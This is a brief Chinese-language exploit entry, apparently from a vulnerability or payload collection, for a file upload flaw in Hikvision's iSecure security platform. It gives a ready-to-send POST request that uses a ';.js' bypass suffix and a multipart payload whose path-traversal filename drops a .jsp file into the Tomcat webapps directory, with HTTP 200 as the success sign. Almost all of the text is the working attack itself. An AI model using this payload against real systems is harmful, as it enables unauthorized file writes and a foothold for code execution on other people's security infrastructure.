# 海康安防iSecure系统文件上传漏洞

海康 ｜ 文件上传 ｜ —
- **请求**：`POST /center/api/files;.js HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryxxmdzwoe
Content-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/dudesite.jsp"
Content-Type:image/jpeg
1
------WebKitFormBoundaryxxmdzwoe--
```
- **响应特征**：200